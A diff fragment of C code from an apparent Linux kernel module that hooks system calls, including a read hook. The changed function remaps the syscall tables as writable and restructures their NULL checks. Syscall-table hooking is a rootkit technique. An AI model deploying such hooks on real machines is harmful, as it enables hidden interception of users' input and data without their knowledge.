@@ -69,21 +69,17 @@ asmlinkage long hooked_sys_read32(unsigned int fd, char __user *buf, size_t coun
 \*****************************************************************************/
 
 void hook_calls(void){
+	sys_call_table = get_writable_sct(get_sys_call_table());
 	if(sys_call_table == NULL){
-		sys_call_table = get_writable_sct(get_sys_call_table());
-		if(sys_call_table == NULL){
-			printk(KERN_INFO "sys_call_table is NULL\n");
-			return;
-		}
+		printk(KERN_INFO "sys_call_table is NULL\n");
+		return;
 	}
 #ifdef CONFIG_IA32_EMULATION
+	ia32_sys_call_table = get_writable_sct(get_ia32_sys_call_table());
 	if(ia32_sys_call_table == NULL){
-		ia32_sys_call_table = get_writable_sct(get_ia32_sys_call_table());
-		if(ia32_sys_call_table == NULL){
-			vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
-			printk(KERN_INFO "ia32_sys_call_table is NULL\n");
-			return;
-		}
+		vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
+		printk(KERN_INFO "ia32_sys_call_table is NULL\n");
+		return;
 	}
 #endif
 
